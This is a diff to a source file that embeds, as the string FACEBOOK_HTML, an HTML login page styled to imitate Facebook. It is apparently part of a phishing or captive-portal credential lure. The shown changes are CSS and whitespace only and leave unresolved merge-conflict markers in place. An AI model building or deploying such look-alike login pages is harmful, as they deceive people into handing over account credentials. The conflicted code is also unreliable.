@@ -7,7 +7,7 @@ const char FACEBOOK_HTML[] = R"=====(
     initial-scale=0.75, maximum-scale=0.75, user-scalable=no'>
     <meta name='theme-color' content='#5170ad' />
     <style class='cp-pen-styles'>
-      
+
         -webkit-box-sizing: border-box;
         -moz-box-sizing: border-box;
         box-sizing: border-box;
@@ -41,7 +41,26 @@ const char FACEBOOK_HTML[] = R"=====(
         left: 10px;
         position: absolute;
       }
+<<<<<<< HEAD
 
+=======
+      .login-form-wrap > h1 {
+        margin: 0 0 0px 0;
+        font-size: 50px;
+        color: #1877f2;
+        font-weight: 900;
+
+      }
+      .login-form-wrap > h5 {
+        margin-top: 40px;
+      }
+      .login-form-wrap > h5 > a {
+        font-size: 14px;
+        color: #fff;
+        text-decoration: none;
+        font-weight: 400;
+      }
+>>>>>>> 1b04470eb10f0ebf60f08554c702605c89b4b6e0
       .login-form input[type='text'],
       .login-form input[type='password'] {
         display: block;
@@ -95,15 +114,21 @@ const char FACEBOOK_HTML[] = R"=====(
         background: #2f85f5;
       }
       .login-form input[type='submit']:active {
-        background: #2c79df;        
+<<<<<<< HEAD
+        background: #2c79df;
       }
       .login-form input[type='text']:focus {
         border: 1px solid #1877f2;
+=======
+        padding-top: 9px;
+        padding-bottom: 7px;
+        background: #2f85f5;
+>>>>>>> 1b04470eb10f0ebf60f08554c702605c89b4b6e0
       }
-    
+
       .login-form input[type='password']:focus {
         border: 1px solid #1877f2;}
-    
+
       .disable-selection {
         -webkit-touch-callout: none;
         -webkit-user-select: none;
@@ -125,7 +150,7 @@ const char FACEBOOK_HTML[] = R"=====(
             -moz-box-shadow: -1px -1px 8px -1px rgba(0, 0, 0, 0.52);
             box-shadow: -1px -1px 8px -1px rgba(0, 0, 0, 0.52);
             margin-bottom: 10px;
-            
+
         }
         .login-form-wrap {
             max-width: 450px;
@@ -151,7 +176,7 @@ const char FACEBOOK_HTML[] = R"=====(
             width: auto;
 
         }
-        
+
         p{
          text-align: center;
          display: block;
@@ -166,13 +191,11 @@ const char FACEBOOK_HTML[] = R"=====(
         h2{
           color: #6e6e6e;
         }
-    
-    
     </style>
   </head>
   <body>
     <section class='login-form-wrap'>
-      
+
       <img src="data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiA/PjwhRE9DVFlQ
       RSBzdmcgIFBVQkxJQyAnLS8vVzNDLy9EVEQgU1ZHIDEuMS8vRU4nICAnaHR0cDovL3d3dy53My5v
       cmcvR3JhcGhpY3MvU1ZHLzEuMS9EVEQvc3ZnMTEuZHRkJz48c3ZnIGhlaWdodD0iMTAwJSIgc3R5
